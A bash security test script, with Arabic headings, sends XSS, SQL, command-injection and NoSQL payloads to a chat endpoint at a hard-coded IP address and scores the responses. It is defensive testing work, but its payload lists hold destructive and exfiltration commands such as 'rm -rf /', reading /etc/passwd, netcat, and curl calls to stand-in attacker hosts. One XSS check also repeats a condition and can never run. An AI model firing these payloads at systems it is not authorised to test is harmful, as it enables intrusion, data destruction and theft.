#!/bin/bash

echo "=== 🔒 Section 6.2: اختبارات Input Validation والحماية من Injection ==="
echo "التاريخ: $(date)"
echo ""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color
INFO='\033[0;34m'

log_critical() {
    echo -e "${RED}❌ CRITICAL: $1${NC}"
}

log_warning() {
    echo -e "${YELLOW}⚠️  WARNING: $1${NC}"
}

log_success() {
    echo -e "${GREEN}✅ SUCCESS: $1${NC}"
}

log_info() {
    echo -e "${INFO}ℹ️  INFO: $1${NC}"
}

# Global counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
WARNINGS=0

increment_test() {
    ((TOTAL_TESTS++))
}

increment_passed() {
    ((PASSED_TESTS++))
}

increment_failed() {
    ((FAILED_TESTS++))
}

increment_warning() {
    ((WARNINGS++))
}

echo "أ. اختبار XSS Protection"
echo "======================"

# XSS payloads to test
declare -a xss_payloads=(
    '<script>alert("XSS")</script>'
    '<img src=x onerror=alert("XSS")>'
    'javascript:alert("XSS")'
    '<svg onload=alert("XSS")>'
    '"><script>alert("XSS")</script>'
    '<iframe src="javascript:alert(\"XSS\")"></iframe>'
    '<body onload=alert("XSS")>'
    '<input onfocus=alert("XSS") autofocus>'
    '<select onfocus=alert("XSS") autofocus><option>test</option></select>'
    '<textarea onfocus=alert("XSS") autofocus>test</textarea>'
)

test_xss_payload() {
    local payload="$1"
    local test_num="$2"
    
    increment_test
    
    echo "XSS Test $test_num: ${payload:0:40}..."
    
    # Test XSS payload in question field
    response=$(curl -s -X POST \
        -F "question=$payload" \
        "http://216.81.248.146:8000/chat" 2>/dev/null)
    
    status_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -F "question=$payload" \
        "http://216.81.248.146:8000/chat" 2>/dev/null)
    
    if [[ "$status_code" == "200" ]]; then
        # Check if the payload appears unescaped in response
        if echo "$response" | grep -q "<script>" 2>/dev/null; then
            log_critical "XSS payload not escaped in response"
            increment_failed
        elif echo "$response" | grep -q "<script>" 2>/dev/null; then
            log_success "XSS payload properly escaped"
            increment_passed
        else
            # Check for any JavaScript-like content in response
            if echo "$response" | grep -iE "(javascript:|<script|onerror=|onload=)" >/dev/null 2>&1; then
                log_warning "Potential XSS content in response"
                increment_warning
            else
                log_success "XSS payload handled safely"
                increment_passed
            fi
        fi
    elif [[ "$status_code" == "400" ]] || [[ "$status_code" == "422" ]]; then
        log_success "XSS payload rejected with validation error ($status_code)"
        increment_passed
    elif [[ "$status_code" == "429" ]]; then
        log_info "Rate limited - will continue testing"
        increment_passed
        sleep 2
    else
        log_warning "Unexpected response: $status_code"
        increment_warning
    fi
}

echo "Testing XSS payloads in /chat endpoint:"
for i in "${!xss_payloads[@]}"; do
    test_xss_payload "${xss_payloads[$i]}" "$((i+1))"
    sleep 0.5  # Brief delay between tests
done

echo ""
echo "ب. اختبار SQL Injection (Expected safe with vector DB)"
echo "=================================================="

# SQL injection payloads
declare -a sql_payloads=(
    "' OR '1'='1"
    "'; DROP TABLE users; --"
    "' UNION SELECT * FROM users --"
    "admin'--"
    "admin' OR '1'='1' --"
    "1' AND (SELECT COUNT(*) FROM users) > 0 --"
    "'; INSERT INTO users VALUES ('hacker', 'password'); --"
    "1' OR SLEEP(5) --"
)

test_sql_payload() {
    local payload="$1"
    local test_num="$2"
    
    increment_test
    
    echo "SQL Test $test_num: $payload"
    
    start_time=$(date +%s)
    status_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -F "question=$payload" \
        "http://216.81.248.146:8000/chat" 2>/dev/null)
    end_time=$(date +%s)
    
    duration=$((end_time - start_time))
    
    if [[ "$status_code" == "200" ]] && [ $duration -lt 30 ]; then
        log_success "SQL payload handled normally (${duration}s) - expected with vector DB"
        increment_passed
    elif [ $duration -gt 30 ]; then
        log_warning "Long processing time (${duration}s) - investigate"
        increment_warning
    elif [[ "$status_code" == "429" ]]; then
        log_info "Rate limited - continuing"
        increment_passed
        sleep 2
    else
        log_info "Response: $status_code"
        increment_passed
    fi
}

for i in "${!sql_payloads[@]}"; do
    test_sql_payload "${sql_payloads[$i]}" "$((i+1))"
    sleep 0.5
done

echo ""
echo "ج. اختبار Command Injection"
echo "=========================="

# Command injection payloads
declare -a cmd_payloads=(
    '; ls -la'
    '| whoami'
    '$(whoami)'
    '`cat /etc/passwd`'
    '; rm -rf /'
    '&& echo vulnerable'
    '; curl http://evil.com'
    '| netcat -l 1234'
    '$(curl http://attacker.com/steal-data)'
    '; python3 -c "import os; os.system(\"id\")"'
)

test_cmd_payload() {
    local payload="$1"
    local test_num="$2"
    
    increment_test
    
    echo "CMD Test $test_num: ${payload}"
    
    start_time=$(date +%s)
    response=$(curl -s -X POST \
        -F "question=What is 2+2 $payload" \
        "http://216.81.248.146:8000/chat" 2>/dev/null)
    status_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -F "question=What is 2+2 $payload" \
        "http://216.81.248.146:8000/chat" 2>/dev/null)
    end_time=$(date +%s)
    
    duration=$((end_time - start_time))
    
    # Check if response contains system information that shouldn't be there
    if echo "$response" | grep -E "(root|uid=|gid=|/bin/|/etc/passwd)" >/dev/null 2>&1; then
        log_critical "Command injection may have succeeded - system info in response"
        increment_failed
    elif [[ "$status_code" == "200" ]] && [ $duration -lt 30 ]; then
        log_success "Command payload handled safely (${duration}s)"
        increment_passed
    elif [ $duration -gt 30 ]; then
        log_warning "Long processing time (${duration}s) - investigate"
        increment_warning
    elif [[ "$status_code" == "429" ]]; then
        log_info "Rate limited - continuing"
        increment_passed
        sleep 2
    else
        log_info "Response: $status_code"
        increment_passed
    fi
}

for i in "${!cmd_payloads[@]}"; do
    test_cmd_payload "${cmd_payloads[$i]}" "$((i+1))"
    sleep 0.5
done

echo ""
echo "د. اختبار NoSQL Injection (Qdrant specific)"
echo "========================================="

# NoSQL/Vector DB specific payloads
declare -a nosql_payloads=(
    '{"$ne": null}'
    '{"$gt": ""}'
    '{"$where": "this.username == this.password"}'
    '{"$regex": ".*"}'
    'null; return true'
    '{"$or": [{"username": "admin"}, {"username": "user"}]}'
)

test_nosql_payload() {
    local payload="$1"
    local test_num="$2"
    
    increment_test
    
    echo "NoSQL Test $test_num: $payload"
    
    status_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -F "question=$payload" \
        "http://216.81.248.146:8000/chat" 2>/dev/null)
    
    if [[ "$status_code" == "200" ]]; then
        log_success "NoSQL payload handled normally - expected with Qdrant"
        increment_passed
    elif [[ "$status_code" == "429" ]]; then
        log_info "Rate limited - continuing"
        increment_passed
        sleep 2
    else
        log_info "Response: $status_code"
        increment_passed
    fi
}

for i in "${!nosql_payloads[@]}"; do
    test_nosql_payload "${nosql_payloads[$i]}" "$((i+1))"
    sleep 0.5
done

echo ""
echo "=== Section 6.2 Results ==="
echo "Tests run: $TOTAL_TESTS"
echo "Passed: $PASSED_TESTS" 
echo "Failed: $FAILED_TESTS"
echo "Warnings: $WARNINGS"
echo ""

if [ $FAILED_TESTS -gt 0 ]; then
    log_critical "Section 6.2 FAILED - Critical injection vulnerabilities found!"
    exit 1
elif [ $WARNINGS -gt 2 ]; then
    log_warning "Section 6.2 PASSED with warnings - review needed"
    exit 2
else
    log_success "Section 6.2 PASSED - Input validation appears secure"
fi
